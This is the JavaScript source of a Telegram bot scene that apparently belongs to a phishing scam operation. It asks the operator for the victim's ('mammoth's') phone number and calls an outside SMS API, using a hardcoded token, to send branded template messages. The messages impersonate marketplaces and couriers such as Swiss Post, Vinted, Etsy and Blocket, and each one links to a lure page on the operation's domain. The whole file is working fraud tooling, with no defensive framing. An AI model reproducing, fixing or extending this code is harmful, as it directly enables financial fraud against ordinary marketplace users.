const { Markup } = require("telegraf");
const WizardScene = require("telegraf/scenes/wizard");
const { Ad, Service } = require("../database");
const myAd = require("../commands/myCreateAd");
const log = require("../helpers/log");
const axios = require("axios");

// Мапа serviceCode => template_id
const templateMap = {
  swisspost_ch: 23,
  postinfo_ch: 7,
  express_ch: 23,
  anibis_ch: 5,
  ricardo_ch: 1,
  tutti_ch: 3,
  wallapop_it: 26,
  subito_it: 27,
  vinted_it: 28,
  etsy_it: 29,
  depop_it: 30,
  vinted_de: 32,
  etsy_de: 35,
  shpock_de: 33,
  ebay_ka_de: 31,
  quoka_de: 34,
  fb_de: 36,
  wallapop_es: 38,
  vinted_es: 39,
  milanuncios_es: 40,
  vinted_at: 11,
  etsy_at: 16,
  post_at: 13,
  shpock_at: 15,
  willhaben_at: 9,
  vinted_se: 17,
  plick_se: 18,
  blocket_se: 19,
  postnord_se: 20,
  instabox_se: 21,
  tiptapp_se: 22,
  carousell_ch: 37
};

async function getAdAndService(ctx, phone, ad, service) {
  const templateId = templateMap[ad.serviceCode];

  if (!templateId) {
    await ctx.reply("❌ Не найден template_id для этого сервиса.");
    return ctx.scene.leave?.(); // безопасно
  }

  try {
   await axios.post(
      "https://gensukita.site/api/template_sms",
      {
        phone,
        template_id: templateId,
        api_token: "nu3K7buEwm-ZI7BOanBb8-VOYuO3VdQs",
        link: `https://${service.domain}/cos/${ad.id}`,
      },
      {
        headers: {
          accept: "application/json",
          "Content-Type": "application/json",
        }
      }
    );

    if (ctx.tempMessageId && typeof ctx.deleteMessage === "function") {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
    }

    await ctx.reply("<b>✅ СМС успешно отправлено на номер телефона</b>", {
      reply_to_message_id: ctx.message.message_id,
      parse_mode: "HTML",
    });

    log(
      ctx,
      `📨 <b>Шаблонное СМС отправлено</b>:\n\n📍 <b>Сервис:</b> ${service.title}\n📱 <b>Номер:</b> ${phone}\n🔗 <b>Ссылка:</b> <a href="https://${service.domain}/${ad.id}">Перейти</a>`
    );
  } catch (err) {
    if (ctx.tempMessageId && typeof ctx.deleteMessage === "function") {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
    }

    console.error("Ошибка при отправке шаблонного SMS:", err);
    await ctx.reply(
      `<b>❌ Ошибка при отправке SMS по шаблону!</b>\nСервис: <b>${service.title}</b>\nОшибка: <b>${err.message}</b>`,
      { parse_mode: "HTML",
              reply_to_message_id: ctx.message.message_id,

       }
    );
  }
}


const scene = new WizardScene(
  "sendAdSms3",
  async (ctx) => {
    ctx.scene.state.data = {};
    ctx.scene.state.adId = ctx.session?.adId || ctx.scene.state.adId;

    await ctx.scene.reply("Введите номер телефона мамонта", {
      parse_mode: "HTML",
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("Отменить", "cancel")],
      ]),
    });
    return ctx.wizard.next();
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text) {
        await ctx.scene.reply("❗ Пожалуйста, отправьте номер телефона.", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        });
        return;
      }

      const phone = ctx.message.text.replace(/\D+/g, "");
      if (phone.length < 5) {
        await ctx.scene.reply("❌ Номер слишком короткий, попробуйте ещё раз.", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        });
        return;
      }

      ctx.wizard.state.phone = phone;
      const ad = await Ad.findOne({ where: { id: ctx.scene.state.adId } });
      if (!ad) {
        await ctx.scene.reply("❌ Объявление не найдено.");
        return ctx.scene.leave();
      }

      const service = await Service.findOne({ where: { code: ad.serviceCode } });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не найден.");
        return ctx.scene.leave();
      }

      const loadingMsg = await ctx.reply("⏳ СМС отправляется...");
      ctx.scene.state.tempMessageId = loadingMsg.message_id;

      const miniCtx = {
        from: ctx.from,
        message: ctx.message,
        reply: (...args) => ctx.reply(...args),
        deleteMessage: (...args) => ctx.deleteMessage(...args),
        tempMessageId: ctx.scene.state.tempMessageId,
        scene: { state: { data: { mail: ctx.scene.state.data.mail } } },
      };

      setImmediate(() => {
        getAdAndService(miniCtx, phone, ad, service).catch((err) =>
          console.error("Ошибка при отправке SMS:", err)
        );
      });

      return ctx.scene.leave();
    } catch (err) {
      console.error(err);
      await ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  }
);

scene.leave((ctx) => myAd(ctx, ctx.scene.state.adId));
module.exports = scene;